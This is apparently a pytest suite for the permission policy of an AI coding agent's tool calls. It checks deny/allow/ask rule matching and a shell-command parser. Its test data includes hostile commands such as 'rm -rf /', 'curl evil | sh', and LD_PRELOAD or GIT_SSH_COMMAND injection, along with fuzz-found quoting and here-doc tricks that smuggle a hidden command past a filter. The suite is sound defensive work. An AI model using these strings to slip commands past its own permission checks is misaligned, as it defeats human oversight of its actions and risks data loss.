import tomllib
from pathlib import Path

import pytest
from luna_core.policy import AnchorTracker, Decision, Policy, Rules, append_rule, suggest_rule
from luna_core.tools.files import edit_file, read_file, write_file
from luna_core.tools.shell import execute
from luna_core.workspace import Workspace


def test_rules_deny_wins_then_ask_then_allow():
    rules = Rules(
        allow=["write:src/*", "execute:git *"], deny=["write_file:/.env"], ask=["execute:git push*"]
    )
    assert rules.match("write_file", {"file_path": ".env"}) == "deny"
    assert rules.match("write_file", {"file_path": "/src/a.py"}) == "allow"
    assert rules.match("execute", {"command": "git push origin"}) == "ask"
    assert rules.match("execute", {"command": "git status"}) == "allow"
    assert rules.match("read_file", {"file_path": "x"}) is None


def test_rules_load_and_append(tmp_path):
    user = tmp_path / "config.toml"
    user.write_text('[permissions]\nallow = ["read_file:*"]\n')
    proj = tmp_path / "permissions.toml"
    proj.write_text('deny = ["execute:rm *"]\n')
    rules = Rules.load([user, proj, tmp_path / "missing.toml"])
    assert rules.allow == ["read_file:*"] and rules.deny == ["execute:rm *"]
    append_rule(proj, "execute:pytest *")
    again = Rules.load([proj])
    assert again.allow == ["execute:pytest *"] and again.deny == ["execute:rm *"]


def test_suggest_rule():
    assert suggest_rule("execute", {"command": "pytest -q tests"}) == "execute:pytest *"
    assert suggest_rule("edit_file", {"file_path": "/src/a.py"}) == "edit_file:src/a.py"


def test_decision_round_trip():
    for d in (
        Decision.approve(),
        Decision.edit({"command": "ls"}),
        Decision.reject("no"),
        Decision("approve", always="execute:ls *"),
    ):
        assert Decision.from_dict(d.to_dict()) == d


def make_policy(tmp_path, **kw):
    return Policy(Rules(deny=["execute:rm *"]), workspace=Workspace(tmp_path), **kw)


def test_policy_verdicts(tmp_path):
    p = make_policy(tmp_path)
    assert p.check(read_file, {"file_path": "a"}).action == "allow"
    ask = p.check(execute, {"command": "pytest"})
    assert ask.action == "ask" and ask.request.suggested_rule == "execute:pytest *"
    deny = p.check(execute, {"command": "rm -rf /"})
    assert deny.action == "deny" and "permission rule" in deny.message
    assert make_policy(tmp_path, yolo=True).check(execute, {"command": "pytest"}).action == "allow"
    assert make_policy(tmp_path, yolo=True).check(execute, {"command": "rm x"}).action == "deny"


def test_plan_mode_refuses_mutations(tmp_path):
    flag = {"on": True}
    p = make_policy(tmp_path, plan_mode=lambda: flag["on"])
    v = p.check(write_file, {"file_path": "a", "content": ""})
    assert v.action == "deny" and "plan mode" in v.message
    assert p.check(read_file, {"file_path": "a"}).action == "allow"
    flag["on"] = False
    assert p.check(write_file, {"file_path": "a", "content": ""}).action == "ask"


def test_always_rule_is_remembered_and_persisted(tmp_path):
    saved = []
    p = make_policy(tmp_path, persist_rule=saved.append)
    p.remember_always("execute:pytest *")
    assert p.check(execute, {"command": "pytest -q"}).action == "allow" and saved == [
        "execute:pytest *"
    ]
    assert p.child().check(execute, {"command": "pytest -q"}).action == "allow"
    assert p.child().anchors is p.anchors
    (tmp_path / "wt").mkdir()
    other = Workspace(tmp_path / "wt")
    assert p.child(other).anchors is not p.anchors and p.child(other).workspace is other


def test_stale_anchor_blocks_edits(tmp_path):
    f = tmp_path / "a.py"
    f.write_text("x = 1\n")
    p = make_policy(tmp_path, yolo=True)
    p.after("read_file", {"file_path": "a.py"}, ok=True)
    assert (
        p.check(edit_file, {"file_path": "a.py", "old_string": "1", "new_string": "2"}).action
        == "allow"
    )
    f.write_text("x = 99\n")  # hand edit
    v = p.check(edit_file, {"file_path": "/a.py", "old_string": "1", "new_string": "2"})
    assert v.action == "deny" and "changed on disk" in v.message
    p.after("read_file", {"file_path": "a.py"}, ok=True)
    assert (
        p.check(edit_file, {"file_path": "a.py", "old_string": "9", "new_string": "2"}).action
        == "allow"
    )


def test_anchor_forget_under(tmp_path):
    (tmp_path / "d").mkdir()
    (tmp_path / "d" / "x").write_text("1")
    t = AnchorTracker(tmp_path)
    t.remember("d/x")
    (tmp_path / "d" / "x").write_text("2")
    assert not t.check("d/x")
    t.forget_under("d")
    assert t.check("d/x")


# -- review finding 1: deny rules must match the normalised/resolved path/command --


def test_deny_rule_matches_normalised_path(tmp_path):
    p = Policy(Rules(deny=["write_file:.env"]), workspace=Workspace(tmp_path), yolo=True)
    for raw in ("src/../.env", "./.env", "/.env", ".env"):
        assert p.check(write_file, {"file_path": raw, "content": ""}).action == "deny", raw


def test_deny_rule_matches_command_with_leading_space(tmp_path):
    p = Policy(Rules(deny=["execute:rm *"]), workspace=Workspace(tmp_path), yolo=True)
    assert p.check(execute, {"command": " rm -rf x"}).action == "deny"


# -- review finding 2: append_rule must not lose data --


def test_append_rule_preserves_other_tables(tmp_path):
    cfg = tmp_path / "config.toml"
    cfg.write_text('[model]\nname = "x"\n\n[permissions]\nallow = ["read_file:*"]\n')
    append_rule(cfg, "write_file:*")
    text = cfg.read_text()
    assert "[model]" in text
    data = tomllib.loads(text)
    assert data["model"]["name"] == "x"
    assert data["permissions"]["allow"] == ["read_file:*", "write_file:*"]


def test_append_rule_escapes_control_characters(tmp_path):
    proj = tmp_path / "permissions.toml"
    rule = 'execute:printf "a\nb\tc" *'
    append_rule(proj, rule)
    again = Rules.load([proj])
    assert again.allow == [rule]


def test_append_rule_raises_on_unparsable_file(tmp_path):
    bad = tmp_path / "broken.toml"
    bad.write_text("foo = [1, 2\n")
    before = bad.read_text()
    with pytest.raises(ValueError):
        append_rule(bad, "execute:ls *")
    assert bad.read_text() == before


# -- final review I3: a commented [permissions] header and broken rule files --


def test_append_rule_handles_a_permissions_header_with_a_comment(tmp_path):
    cfg = tmp_path / "config.toml"
    cfg.write_text('[model]\nname = "x"\n\n[ permissions ]  # mine\ndeny = ["execute:rm *"]\n')
    append_rule(cfg, "execute:ls *")
    data = tomllib.loads(cfg.read_text())
    assert data["model"]["name"] == "x"
    assert data["permissions"] == {"allow": ["execute:ls *"], "deny": ["execute:rm *"]}


def test_append_rule_refuses_a_splice_that_would_break_the_file(tmp_path):
    cfg = tmp_path / "config.toml"
    cfg.write_text('permissions.deny = ["execute:rm *"]\n\n[model]\nname = "x"\n')
    before = cfg.read_text()
    with pytest.raises(ValueError):
        append_rule(cfg, "execute:ls *")
    assert cfg.read_text() == before


def test_rules_load_fails_closed_on_a_broken_file(tmp_path):
    from luna_core.policy import RulesFileError

    bad = tmp_path / "permissions.toml"
    bad.write_text('deny = ["execute:rm *"\n')
    with pytest.raises(RulesFileError) as info:
        Rules.load([bad])
    assert str(bad) in str(info.value)
    wrong = tmp_path / "wrong.toml"
    wrong.write_text('permissions = "deny everything"\n')
    with pytest.raises(RulesFileError):
        Rules.load([wrong])
    assert Rules.load([tmp_path / "missing.toml"]).deny == []


def test_policy_check_survives_an_invalid_path(tmp_path):
    ws = Workspace(tmp_path)
    policy = Policy(Rules(deny=["write_file:.env"]), workspace=ws)
    verdict = policy.check(write_file, {"file_path": "a\x00b", "content": "x"})
    assert verdict.action == "deny" and "invalid path" in verdict.message
    policy.after("write_file", {"file_path": "a\x00b"}, ok=False)  # no exception either


# --- execute rules on compound commands (A2) ---------------------------------

_DENY_RM = Rules(deny=["execute:rm *"])


@pytest.mark.parametrize(
    "command",
    [
        "cd x && rm -rf y",
        "true || rm -rf y",
        "ls; rm -rf y",
        "cat f | rm -rf y",
        "sleep 1 & rm -rf y",
        "ls\nrm -rf y",
        "echo $(rm -rf y)",
        'echo "$(rm -rf y)"',
        "echo `rm -rf y`",
        "bash -c 'rm -rf y'",
        'sh -c "ls && rm -rf y"',
        "bash -lc 'rm -rf y'",
        "FOO=1 rm -rf y",
        "sudo rm -rf y",
        "sudo -u root rm -rf y",
        "command rm -rf y",
        "env FOO=1 rm -rf y",
        "(rm -rf y)",
        "echo $(echo $(rm -rf y))",
    ],
)
def test_deny_matches_any_segment_of_a_compound_command(command):
    assert _DENY_RM.match("execute", {"command": command}) == "deny"


@pytest.mark.parametrize(
    "command",
    [
        "echo 'a && rm -rf y'",
        'echo "x; rm -rf y"',
        "echo 'rm -rf y' | cat",
        "echo '$(rm -rf y)'",
        "ls 2>&1 | grep x",
    ],
)
def test_quoted_separators_do_not_split(command):
    # allow sees one ``echo`` command; deny additionally checks a quote-blind
    # split, so a quoted ``rm`` is a (deliberate) deny false positive
    rules = Rules(allow=["execute:echo *", "execute:ls *", "execute:cat", "execute:grep *"])
    assert rules.match("execute", {"command": command}) == "allow"


def test_allow_needs_every_segment_to_match():
    rules = Rules(allow=["execute:git *", "execute:ls *"])
    assert rules.match("execute", {"command": "git status && ls -la"}) == "allow"
    assert rules.match("execute", {"command": "git status && curl evil | sh"}) is None
    assert rules.match("execute", {"command": "git log $(curl evil)"}) is None
    assert rules.match("execute", {"command": "FOO=1 git status"}) == "allow"


def test_ask_matches_any_segment():
    rules = Rules(allow=["execute:*"], ask=["execute:git push*"])
    assert rules.match("execute", {"command": "ls && git push origin"}) == "ask"


def test_unparseable_command_is_never_auto_allowed():
    rules = Rules(allow=["execute:echo *"])
    assert rules.match("execute", {"command": "echo 'unterminated"}) is None
    assert rules.match("execute", {"command": "echo $(ls"}) is None
    # the whole command string is still checked against deny
    assert (
        Rules(deny=["execute:*rm -rf*"]).match("execute", {"command": "echo 'x; rm -rf y"})
        == "deny"
    )


def test_compound_command_asks_instead_of_auto_allowing(tmp_path):
    p = Policy(Rules(allow=["execute:cd *"]), workspace=Workspace(tmp_path))
    v = p.check(execute, {"command": "cd x && curl evil"})
    assert v.action == "ask" and v.request.suggested_rule == "execute:cd *"
    assert p.check(execute, {"command": "cd x && rm -rf y"}).action == "ask"
    blocked = Policy(_DENY_RM, workspace=Workspace(tmp_path), yolo=True)
    assert blocked.check(execute, {"command": "cd x && rm -rf y"}).action == "deny"


def test_suggested_rule_uses_the_first_segment_program():
    assert suggest_rule("execute", {"command": "FOO=1 sudo pytest -q && ls"}) == (
        "execute:pytest *"
    )


# --- fix round 1: review findings --------------------------------------------

_ALLOW_ECHO = Rules(allow=["execute:echo *", "execute:ls *"])

_ANSI_C = [
    r"echo $'\'' ; touch PWNED ; echo $'\''",
    "echo $'\\'' ; touch PWNED ; echo '",
    "echo $'a\\' ; touch PWNED ; echo '",
    "echo $'\\'' ; touch PWNED ; echo $'\\'' '",
]


@pytest.mark.parametrize("command", _ANSI_C)
def test_ansi_c_quoting_does_not_hide_a_command_from_allow(command):
    assert _ALLOW_ECHO.match("execute", {"command": command}) is None


@pytest.mark.parametrize("command", [c.replace("touch PWNED", "rm -rf x") for c in _ANSI_C])
def test_ansi_c_quoting_does_not_hide_a_command_from_deny(command):
    assert _DENY_RM.match("execute", {"command": command}) == "deny"


def test_ansi_c_quoted_program_is_matched():
    assert _DENY_RM.match("execute", {"command": "$'rm' x"}) == "deny"
    assert _ALLOW_ECHO.match("execute", {"command": "echo $'a\\tb'"}) == "allow"


@pytest.mark.parametrize(
    "command",
    [
        "cat <<'EOF'\n'\nEOF\nrm -rf x",
        "cat <<EOF\n'\nEOF\nrm -rf x; echo '",
        "cat <<EOF\n$(rm -rf x)\nEOF",
        "echo 'unterminated; rm -rf x",
    ],
)
def test_here_docs_and_unparseable_lines_still_hit_deny_under_yolo(tmp_path, command):
    p = Policy(_DENY_RM, workspace=Workspace(tmp_path), yolo=True)
    assert p.check(execute, {"command": command}).action == "deny"


def test_here_doc_body_is_data_not_commands():
    rules = Rules(allow=["execute:cat *"])
    assert rules.match("execute", {"command": "cat <<'EOF'\nhello; world\nEOF"}) == "allow"


@pytest.mark.parametrize(
    "command",
    [
        "if true; then rm x; fi",
        "for f in a; do rm $f; done",
        "while :; do rm x; done",
        "until false; do rm x; done",
        "if false; then :; else rm x; fi",
        "if false; then :; elif rm x; then :; fi",
        "/bin/rm x",
        "nice rm x",
        "nice -n 5 rm x",
        "timeout 5 rm x",
        "timeout -s KILL 5 rm x",
        "doas rm x",
        "doas -u root rm x",
        "stdbuf -o0 rm x",
    ],
)
def test_keywords_paths_and_more_prefixes_hit_deny(command):
    assert _DENY_RM.match("execute", {"command": command}) == "deny"


def test_basename_variant_is_not_used_for_allow():
    assert Rules(allow=["execute:rm *"]).match("execute", {"command": "/tmp/evil/rm x"}) is None


def test_redirection_forms_are_not_separators():
    rules = Rules(allow=["execute:echo *"])
    assert rules.match("execute", {"command": "echo hi >| out.txt"}) == "allow"
    assert rules.match("execute", {"command": "echo a\\\nb"}) == "allow"


# Cross-check against a real shell: whatever ``sh`` would run must be visible.
_TOKS = ["$'", "'", "\\", '"', "\\'", "#", "`", "a", "$(", ")", "${", "}", "\n"]
_TAILS = ["", "'", "$'", '"', "\\'", "#'", "`"]


def _corpus(max_len: int) -> list[str]:
    import itertools

    out = []
    for size in range(1, max_len + 1):
        for combo in itertools.product(_TOKS, repeat=size):
            for tail in _TAILS:
                out.append("echo " + "".join(combo) + " ; touch PWNED ; echo " + tail)
    return out


def _sh_creates_pwned(command: str, tmp_path) -> bool:
    import subprocess

    marker = tmp_path / "PWNED"
    marker.unlink(missing_ok=True)
    subprocess.run(["/bin/sh", "-c", command], cwd=tmp_path, capture_output=True, timeout=5)
    return marker.exists()


@pytest.mark.skipif(not Path("/bin/sh").exists(), reason="needs /bin/sh")
def test_fuzz_allow_never_approves_a_line_that_runs_touch(tmp_path):
    allowed = [c for c in _corpus(3) if _ALLOW_ECHO.match("execute", {"command": c}) == "allow"]
    leaks = [c for c in allowed if _sh_creates_pwned(c, tmp_path)]
    assert leaks == []


@pytest.mark.skipif(not Path("/bin/sh").exists(), reason="needs /bin/sh")
def test_fuzz_deny_catches_every_line_that_runs_touch(tmp_path):
    rules = Rules(deny=["execute:touch *"])
    missed = [
        c
        for c in _corpus(2)
        if rules.match("execute", {"command": c}) != "deny" and _sh_creates_pwned(c, tmp_path)
    ]
    assert missed == []


@pytest.mark.skipif(not Path("/bin/sh").exists(), reason="needs /bin/sh")
def test_fuzz_parser_alone_sees_every_command_sh_runs(tmp_path):
    """Without the quote-blind safety net, the parser must either see ``touch`` or give up."""
    from luna_core.shellsplit import split_command

    def sees_touch(command: str) -> bool:
        readings = [split_command(command), split_command(command, ansi_c=False)]
        return any(p is None or "touch PWNED" in p.commands for p in readings)

    missed = [c for c in _corpus(2) if not sees_touch(c) and _sh_creates_pwned(c, tmp_path)]
    assert missed == []


# --- fix round 2 --------------------------------------------------------------

_ALLOW_CAT = Rules(allow=["execute:echo *", "execute:cat *"])


@pytest.mark.parametrize(
    "command",
    [
        "cat <<'E'$\"\"\nE\ntouch PWNED",
        "echo <<'E'$\"\"\nE\n#\ntouch PWNED",
        'cat <<E""\nE\ntouch PWNED',
        'cat <<"E"x\nEx\ntouch PWNED',
        "cat <<E\\\nE\ntouch PWNED",
        "echo  }${<<-E<<'E' }\ntouch PWNED\t",
        "cat <<E\nnever terminated\ntouch PWNED",
    ],
)
def test_odd_here_doc_delimiters_are_never_auto_allowed(command):
    assert _ALLOW_CAT.match("execute", {"command": command}) is None


@pytest.mark.parametrize(
    "command",
    [
        ">/dev/null rm -rf x",
        "2>&1 rm x",
        "</dev/null rm x",
        ">f rm x",
        "> f rm x",
        "<<'E' rm x",
        "echo ;<<'E' rm x",
        "sudo >/dev/null rm x",
        "rm",
    ],
)
def test_leading_redirections_do_not_hide_the_program(command):
    assert _DENY_RM.match("execute", {"command": command}) == "deny"


_EVERYDAY = Rules(
    allow=[
        f"execute:{p} *"
        for p in ("git pytest echo ls uv grep cat python npm cd head wc sed find tail".split())
    ]
)


@pytest.mark.parametrize(
    "command",
    [
        'git commit -m "fix; thing"',
        "pytest -k 'a or b'",
        "echo $'a\\tb'",
        'git log --format="%h | %s" -5',
        "uv run pytest -q 2>&1 | tail -2",
        "ls -la && git status",
        "grep -rn 'foo|bar' .",
        "cd src && ls",
        'git commit -m "$(cat msg.txt)"',
        "cat <<'EOF' > f.txt\nhello; rm x\nEOF",
        'echo "it\'s"',
        "pytest tests/ -x",
        "find . -name '*.py' | head",
        "sed -n '1,5p' f",
        "python -c 'print(1); print(2)'",
        "npm run build -- --mode=prod",
        "git commit -m 'a (b) c'",
        "echo ${HOME}",
        "ls *.py",
        "git diff HEAD~1 -- 'a b.py'",
        r"echo a\;b",
        "ls # list",
        "ls",
    ],
)
def test_everyday_commands_stay_auto_allowed(command):
    assert _EVERYDAY.match("execute", {"command": command}) == "allow"


def test_suggested_rules_cover_every_command_not_yet_allowed(tmp_path):
    p = Policy(Rules(allow=["execute:git *"]), workspace=Workspace(tmp_path))
    request = p.check(execute, {"command": "cd src && ls && git status"}).request
    assert request.suggested_rule == "execute:cd *"
    assert request.suggested_rules == ("execute:cd *", "execute:ls *")
    for rule in request.suggested_rules:
        p.remember_always(rule)
    assert p.check(execute, {"command": "cd src && ls && git status"}).action == "allow"


def test_suggested_rules_for_a_simple_call():
    from luna_core.policy import suggest_rules

    assert suggest_rules("write_file", {"file_path": "a.txt"}) == ("write_file:a.txt",)
    assert suggest_rules("execute", {"command": "cd x && ls"}) == ("execute:cd *", "execute:ls *")


@pytest.mark.parametrize(
    "command",
    [
        "echo &<<'E'${\\\n}<<-E touch PWNED&\n \\\"",
        'echo \\\n\n<<-E}#\\"a touch PWNED\nif then ',
        "echo \n<<'E'\\\n\\= touch PWNED }",
        "echo \nE\n=;<<-E<<E\\\n* touch PWNED",
        "echo \\;|<<-E<<'E'\\\n= touch PWNED",
    ],
)
def test_fuzz_found_deny_bypasses(command):
    assert Rules(deny=["execute:touch *"]).match("execute", {"command": command}) == "deny"


@pytest.mark.parametrize(
    "command",
    [
        "echo |<<'E'\\ }\"a touch PWNED",
        "echo \n<<-E$()\\\nE touch PWNED",
        "echo &<<-E'<<'E' ${$' touch PWNED",
        ">'a b' touch PWNED",
    ],
)
def test_redirection_targets_with_spaces_do_not_hide_the_program(command):
    assert Rules(deny=["execute:touch *"]).match("execute", {"command": command}) == "deny"


# --- fix round 3: "always" must never persist a catch-all rule -----------------


@pytest.mark.parametrize(
    "command",
    [
        'ls && "*" x',
        "ls\n*",
        "ls `*`",
        'eval "*"',
        "ls && ? x",
        "ls && [a-z]* x",
        "ls && $X y",
        "ls | xargs rm",
        "ls && find . -delete",
    ],
)
def test_no_multi_rule_always_when_a_command_has_no_safe_rule(tmp_path, command):
    p = Policy(Rules(), workspace=Workspace(tmp_path))
    request = p.check(execute, {"command": command}).request
    assert request.suggested_rules == ()


@pytest.mark.parametrize(
    "rule",
    [
        "execute:* *",
        "execute:*",
        "*:*",
        "execute:? *",
        "execute:[a-z]* *",
        "execute:$X *",
        "execute:bash *",
        "execute:sudo *",
        "execute:eval *",
        "execute:xargs *",
        'execute:"*" *',
    ],
)
def test_unsafe_execute_allow_rules_are_never_saved(tmp_path, rule):
    from luna_core.policy import UnsafeRule

    saved = []
    p = Policy(Rules(), workspace=Workspace(tmp_path), persist_rule=saved.append)
    with pytest.raises(UnsafeRule):
        p.remember_always(rule)
    assert p.rules.allow == [] and saved == []
    with pytest.raises(UnsafeRule):
        append_rule(tmp_path / "permissions.toml", rule)
    assert not (tmp_path / "permissions.toml").exists()


def test_safe_rules_still_save(tmp_path):
    for rule in ("execute:pytest *", "execute:./run.sh *", "write_file:src/*", "execute:git log *"):
        append_rule(tmp_path / "p.toml", rule)
    assert append_rule(tmp_path / "p.toml", "execute:rm *", kind="deny")


# --- fix round 3: the rough deny net must not silently give up -----------------


_CAP_LINES = [
    ">/dev/null " * n + ">'a b' touch PWNED" + tail
    for n in (3, 70)
    for tail in ("", " <<'E'$\"\"", "\n'")
]


@pytest.mark.parametrize("command", _CAP_LINES)
def test_many_redirections_still_hit_deny_under_yolo(tmp_path, command):
    p = Policy(Rules(deny=["execute:touch *"]), workspace=Workspace(tmp_path), yolo=True)
    assert p.check(execute, {"command": command}).action == "deny"


def test_rough_overflow_fails_closed(tmp_path, monkeypatch):
    import luna_core.shellsplit as shellsplit

    monkeypatch.setattr(shellsplit, "_MAX_ROUGH_CUTS", 2)
    line = "echo >a >b >'c d' x <<'E'$\"\""  # unparseable, and the cut budget runs out
    assert shellsplit.rough_split(line)[1] is False
    deny = Policy(Rules(deny=["execute:rm *"]), workspace=Workspace(tmp_path), yolo=True)
    assert deny.check(execute, {"command": line}).action == "deny"
    plain = Policy(Rules(), workspace=Workspace(tmp_path), yolo=True)
    assert plain.check(execute, {"command": line}).action == "ask"  # yolo cannot skip it


def test_long_unparseable_line_fails_closed(tmp_path):
    line = "echo " + "x " * 3000 + "'"
    assert Rules(deny=["execute:rm *"]).match("execute", {"command": line}) == "deny"
    assert Rules().match("execute", {"command": line}) == "ask"


# --- allow never covers a privilege prefix or a code-injecting variable ---------

_ALLOW_GIT = Rules(allow=["execute:git *", "execute:ls *"])


@pytest.mark.parametrize(
    "command",
    [
        "sudo git status",
        "doas git status",
        "env git status",
        "env X=1 git status",
        "exec git status",
        "command git status",
        "LD_PRELOAD=evil.so git status",
        "DYLD_INSERT_LIBRARIES=x git status",
        "PATH=/tmp/evil:$PATH git status",
        "GIT_SSH_COMMAND='sh -c evil' git fetch",
        "GIT_CONFIG_GLOBAL=/tmp/c git status",
        "GIT_EXEC_PATH=/tmp git status",
        "PYTHONPATH=/tmp git status",
        "NODE_OPTIONS=--require=x git status",
        "BASH_ENV=/tmp/x git status",
        "IFS=x git status",
        "ls && sudo git status",
    ],
)
def test_allow_does_not_cover_privilege_prefixes_or_injecting_variables(command):
    assert _ALLOW_GIT.match("execute", {"command": command}) is None


@pytest.mark.parametrize(
    "command",
    ["time git status", "nice git log", "timeout 5 git status", "stdbuf -o0 git log",
     "FOO=1 git status", "GIT_PAGER_IN_USE=1 git log"],
)  # fmt: skip
def test_harmless_prefixes_and_assignments_still_allow(command):
    assert _ALLOW_GIT.match("execute", {"command": command}) == "allow"


def test_deny_still_sees_through_privilege_prefixes():
    assert _DENY_RM.match("execute", {"command": "sudo LD_PRELOAD=x rm -rf /"}) == "deny"
